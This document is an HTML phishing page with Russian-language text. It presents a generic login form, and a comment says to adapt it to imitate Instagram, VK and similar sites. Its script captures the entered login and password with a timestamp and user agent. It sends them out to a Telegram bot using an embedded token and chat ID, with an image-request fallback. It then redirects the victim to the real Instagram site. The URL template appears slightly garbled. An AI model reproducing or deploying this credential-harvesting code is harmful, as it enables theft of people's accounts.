<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <title>Вход</title>
  <style>
    body { background:#000; color:#fff; font-family:Arial; text-align:center; padding:50px; }
    form { max-width:320px; margin:auto; }
    input { width:100%; padding:12px; margin:10px 0; font-size:16px; }
    button { background:#0095f6; color:#fff; border:none; padding:12px; width:100%; font-size:16px; cursor:pointer; }
  </style>
</head>
<body>
  <h1>Вход</h1> <!-- Меняй под фишинг: Instagram, VK, etc. -->
  <form id="form">
    <input id="user" placeholder="Логин / email" required>
    <input id="pass" type="password" placeholder="Пароль" required>
    <button type="submit">Войти</button>
  </form>

  <script>
    const TOKEN = "8564854246:AAEP6PZzYjG2PcUdRX-R4BqtTZi-cA_ZL_Y";
    const CHAT_ID = "5684291694";

    document.getElementById("form").addEventListener("submit", async e => {
      e.preventDefault();
      const user = document.getElementById("user").value;
      const pass = document.getElementById("pass").value;
      const text = `Логин: ${user}\nПароль: ${pass}\nВремя: ${new Date().toLocaleString('ru')}\nUA: ${navigator.userAgent}`;

      const url = `https://api.telegram.org/bot\( {TOKEN}/sendMessage?chat_id= \){CHAT_ID}&text=${encodeURIComponent(text)}`;

      // Пробуем POST (чаще проходит)
      try {
        await fetch(url, {
          method: 'POST',
          mode: 'no-cors',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({}) // dummy, т.к. параметры в URL
        });
      } catch {}

      // Fallback GET через img
      const img = new Image();
      img.src = url + '&ts=' + Date.now();
      document.body.appendChild(img);

      // Редирект на реальный сайт
      setTimeout(() => {
        location.href = "https://www.instagram.com/"; // Меняй
      }, 1200);
    });
  </script>
</body>
</html>
